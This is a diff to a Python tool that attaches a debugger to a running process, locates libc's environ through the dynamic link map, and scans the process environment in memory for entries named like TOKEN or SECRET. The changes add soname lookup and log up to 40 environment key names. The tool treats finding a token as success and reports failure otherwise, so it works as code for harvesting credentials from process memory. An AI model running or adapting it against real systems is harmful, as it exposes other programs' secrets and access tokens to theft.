@@ -200,6 +200,13 @@ def read_c_string(debugger, address, limit=512):
     return data.split(b"\0", 1)[0] if data else b""
 
 
+def elf_soname(debugger, base):
+    tags = dynamic_tags(debugger, base)
+    if not tags.get(5) or 14 not in tags:
+        return b""
+    return read_c_string(debugger, tags[5] + tags[14], 128)
+
+
 def link_map_from_object(debugger, base):
     tags = dynamic_tags(debugger, base)
     pltgot = tags.get(3, 0)
@@ -433,11 +440,16 @@ def main():
             libc_base, environ = find_libc_from_relocations(debugger, object_base)
         if not environ:
             fatal("could not locate libc environ through link-map or relocations")
+        print(
+            f"PIPE_LIBC base=0x{libc_base:x} soname={elf_soname(debugger, libc_base).decode('utf-8', 'replace')}",
+            flush=True,
+        )
         pointer = debugger.read_memory(environ, 8)
         envp = u64(pointer) if len(pointer) == 8 else 0
         if not valid_pointer(envp):
             fatal("libc environ pointer was invalid")
         found = 0
+        env_entries = 0
         for index in range(4096):
             slot = debugger.read_memory(envp + index * 8, 8)
             if len(slot) != 8:
@@ -450,6 +462,9 @@ def main():
                 continue
             raw_key, raw_value = value.split(b"=", 1)
             key = raw_key.decode("ascii", "replace")
+            env_entries += 1
+            if env_entries <= 40:
+                print(f"PIPE_ENV_KEY index={env_entries} key={key}", flush=True)
             if (
                 "TOKEN" in key
                 or "SECRET" in key
@@ -457,7 +472,11 @@ def main():
             ):
                 secret_summary(key, raw_value)
                 found += 1
-        print(f"PIPE_ENV_SCAN secrets={found} inherited_environment_entries={len(os.environ)}", flush=True)
+        print(
+            f"PIPE_ENV_SCAN entries={env_entries} secrets={found} "
+            f"inherited_environment_entries={len(os.environ)}",
+            flush=True,
+        )
         if not found:
             fatal("debug read worked but no token-bearing environment entry was found")
     finally:
